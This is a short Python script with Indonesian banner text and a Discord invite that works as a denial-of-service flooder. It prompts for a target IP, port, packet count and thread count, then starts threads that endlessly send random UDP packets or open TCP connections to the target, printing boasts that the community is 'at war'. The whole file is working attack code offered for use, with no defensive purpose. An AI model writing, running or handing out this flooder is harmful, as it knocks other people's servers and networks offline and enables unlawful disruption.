#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > AGUSSAMP COMMUNITY NIH BOS!! < - - ")
print       (" - - > AGUSSAMP#0965 <- - ")                                   
print       (" - - > GATERIMA PM AJA ANJING !! < - - ")
print       (" - - > KOMUNITAS GUA? DIBAWAH TOD < - - ")
print       (" - - > https://discord.gg/CEbs6UFgga < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" SERIUS MAU NYERANG? (y/n):"))
times = int(input(" Paket Dari Agus:"))
threads = int(input(" Isi Kota Paket:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" AGUSSAMP COMMUNITY SEDANG PERANG ")
		except:
			print("[!] LO KO DOWN")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" AGUSSAMP COMMUNITY SEDANG PERANG ")
		except:
			s.close()
			print("[*] LO KO DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()